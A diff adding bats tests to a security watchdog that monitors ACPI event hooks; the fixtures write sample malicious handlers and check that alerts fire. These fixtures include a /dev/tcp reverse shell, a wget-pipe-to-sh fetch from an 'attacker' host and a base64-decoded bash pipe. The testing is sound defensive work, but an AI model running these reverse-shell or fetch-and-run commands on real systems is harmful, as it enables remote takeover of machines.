@@ -150,3 +150,55 @@ cap() { cat "${SELFDEF_TEST_LOGCAP}"; }
     cap | grep -q '"event":"module_lib_missing"'
     cap | grep -q '"severity":"alert"'
 }
+
+@test "baseline is chmod 0600 (confidentiality — acpi-hooks inventory enumerates ACPI-event-trigger root-exec surface)" {
+    printf 'event=button/power\naction=/etc/acpi/actions/power.sh\n' > "${BIND}"
+    run_wd
+    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
+}
+
+@test "INVARIANT (action= under /var/tmp — preserved extra writable-root expansion)" {
+    printf 'event=button/lid\naction=/var/tmp/.attacker.sh\n' > "${BIND}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (action= under /home — user-writable preserved extra coverage)" {
+    printf 'event=button/lid\naction=/home/user/.attacker.sh\n' > "${BIND}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (handler with /dev/tcp reverse shell): canonical reverse-shell pattern" {
+    printf '#!/bin/sh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${EVENTS}/handler.sh"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (handler with wget-pipe-sh): wget bootstrap" {
+    printf '#!/bin/sh\nwget -qO- http://attacker/p | sh\n' > "${EVENTS}/handler.sh"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (handler with base64-decode-pipe): obfuscation" {
+    printf '#!/bin/sh\necho YmFzaCAtaQ== | base64 -d | bash\n' > "${EVENTS}/handler.sh"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (world-writable event binding file → alert)" {
+    printf 'event=button/power\naction=/etc/acpi/actions/power.sh\n' > "${BIND}"
+    run_wd
+    chmod 0666 "${BIND}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
+    printf 'event=button/power\naction=/etc/acpi/actions/power.sh\n' > "${BIND}"
+    run_wd
+    main_count=$(cap | grep -cE '^-t selfdef-acpi-hooks -- ')
+    [ "${main_count}" = "1" ]
+}
